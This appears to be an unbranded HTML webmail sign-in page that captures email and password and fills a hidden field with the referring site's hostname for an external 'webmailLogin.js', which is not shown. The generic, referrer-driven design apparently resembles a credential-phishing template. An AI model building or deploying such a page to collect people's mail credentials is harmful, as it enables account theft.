<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sign In</title>

  <!-- Inter font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />

  <!-- Tailwind CDN -->
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    body { font-family: 'Inter', sans-serif; }
  </style>
</head>

<body class="min-h-screen flex items-center justify-center bg-gradient-to-tr from-blue-600 to-blue-400 dark:from-gray-800 dark:to-gray-600">

  <div class="w-full max-w-md bg-white dark:bg-gray-800 rounded-xl shadow-lg p-8 mx-4">
    <!-- error box -->
    <div id="error-msg" aria-live="assertive"
         class="hidden mb-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded"></div>

    <h1 class="text-2xl font-semibold text-gray-800 dark:text-gray-100 text-center mb-6">
      Sign in to your account
    </h1>

    <form id="login-form" class="space-y-6" method="POST" action="/your-login-endpoint">
      <!-- Email -->
      <div>
        <label for="email" class="block text-sm font-medium text-gray-700 dark:text-gray-300">Email address</label>
        <div class="mt-1 relative rounded-md shadow-sm">
          <span class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400 dark:text-gray-500" viewBox="0 0 20 20" fill="currentColor">
              <path d="M2.94 4.94A2 2 0 014.94 4h10.12a2 2 0 012 2v.002l-7.059 4.236a1 1 0 01-1.062 0L2.94 6.942z"/>
              <path d="M2.94 8.176l5.764 3.458a3 3 0 003.472 0l5.764-3.458V14a2 2 0 01-2 2H4a2 2 0 01-2-2V8.176z"/>
            </svg>
          </span>
          <input id="email" name="email" type="email" required placeholder="you@example.com"
                 class="block w-full pl-10 pr-3 py-2 border border-gray-300 dark:border-gray-600
                        bg-white dark:bg-gray-700 rounded-md placeholder-gray-400 dark:placeholder-gray-500
                        focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500
                        text-gray-900 dark:text-gray-100">
        </div>
      </div>

      <!-- Password -->
      <div>
        <label for="password" class="block text-sm font-medium text-gray-700 dark:text-gray-300">Password</label>
        <div class="mt-1 relative rounded-md shadow-sm">
          <span class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400 dark:text-gray-500" viewBox="0 0 20 20" fill="currentColor">
              <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2h1a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2v-6a2 2 0 012-2h1zm2-2a3 3 0 016 0v2H7V7zm-1 4a1 1 0 00-1 1v4a1 1 0 001 1h6a1 1 0 001-1v-4a1 1 0 00-1-1H6z" clip-rule="evenodd"/>
            </svg>
          </span>
          <input id="password" name="password" type="password" required placeholder="••••••••"
                 class="block w-full pl-10 pr-10 py-2 border border-gray-300 dark:border-gray-600
                        bg-white dark:bg-gray-700 rounded-md placeholder-gray-400 dark:placeholder-gray-500
                        focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500
                        text-gray-900 dark:text-gray-100">

          <!-- Professional toggle button -->
          <button type="button" id="togglePw"
                  class="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-500 dark:text-gray-400
                         focus:outline-none" aria-label="Show or hide password">
            <!-- eye open -->
            <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none"
                 viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
              <path stroke-linecap="round" stroke-linejoin="round"
                    d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7
                       c-1.274 4.057-5.065 7-9.542 7s-8.268-2.943-9.542-7z" />
              <circle cx="12" cy="12" r="3" />
            </svg>
            <!-- eye closed -->
            <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 hidden" fill="none"
                 viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
              <path stroke-linecap="round" stroke-linejoin="round"
                    d="M13.875 18.825A10.05 10.05 0 0112 19c-4.477 0-8.268-2.943-9.542-7
                       a10.056 10.056 0 012.457-4.485M6.7 6.7A10.05 10.05 0 0112 5
                       c4.477 0 8.268 2.943 9.542 7a10.056 10.056 0 01-1.004 2.01M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
              <line x1="3" y1="3" x2="21" y2="21"
                    stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </button>
        </div>
      </div>

      <!-- Remember me -->
      <div class="flex items-center">
        <input id="remember" name="remember" type="checkbox"
               class="h-4 w-4 text-blue-600 dark:text-blue-500 focus:ring-blue-500
                      border-gray-300 dark:border-gray-600 rounded">
        <label for="remember" class="ml-2 block text-sm text-gray-700 dark:text-gray-300">Remember me</label>
      </div>

      <!-- HIDDEN webmail_host field (will be populated via JS) -->
      <input type="hidden" id="webmail_host" name="webmail_host" value="" />

      <!-- Submit (spinner added) -->
      <div>
        <button id="submit-btn" type="submit"
                class="w-full flex justify-center items-center py-2 px-4 border border-transparent
                       rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700
                       focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500
                       transition disabled:opacity-50 disabled:cursor-not-allowed">
          <!-- spinner -->
          <svg id="loginSpinner"
               class="hidden animate-spin h-5 w-5 mr-2 text-white"
               xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle class="opacity-25" cx="12" cy="12" r="10"
                    stroke="currentColor" stroke-width="4"></circle>
            <path class="opacity-75" fill="currentColor"
                  d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
          </svg>
          <span id="loginLabel">Sign&nbsp;In</span>
        </button>
      </div>
    </form>

    <div class="mt-4 text-center">
      <a href="#" class="text-sm text-blue-600 dark:text-blue-300 hover:underline">Forgot your password?</a>
    </div>
  </div>

  <!-- Alias IDs before legacy script loads -->
  <script>
    (function () {
      const lf = document.getElementById('login-form');
      if (lf) lf.id = 'form';      // expected by webmailLogin.js
      const sb = document.getElementById('submit-btn');
      if (sb) sb.id = 'login-btn'; // expected by webmailLogin.js
    })();
  </script>

  <!-- eye toggle -->
  <script>
    document.getElementById('togglePw').addEventListener('click', () => {
      const pw = document.getElementById('password');
      const open = document.getElementById('eyeOpen');
      const closed = document.getElementById('eyeClosed');
      const hidden = pw.type === 'password';
      pw.type = hidden ? 'text' : 'password';
      open.classList.toggle('hidden', !hidden);
      closed.classList.toggle('hidden', hidden);
    });
  </script>

  <!-- Populate the hidden "webmail_host" input on page load -->
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      // Attempt to parse document.referrer; if available, extract its host.
      let hostValue = '';
      try {
        if (document.referrer) {
          const url = new URL(document.referrer);
          hostValue = url.hostname; 
        }
      } catch (e) {
        console.warn('Could not parse referrer:', e);
      }
      // If you want a fallback (e.g. current hostname), uncomment the next line:
      // if (!hostValue) { hostValue = window.location.hostname; }

      const hiddenField = document.getElementById('webmail_host');
      if (hiddenField) {
        hiddenField.value = hostValue; 
      }
    });
  </script>

  <!-- Your existing login logic -->
  <script src="js/webmailLogin.js" defer></script>
</body>
</html>
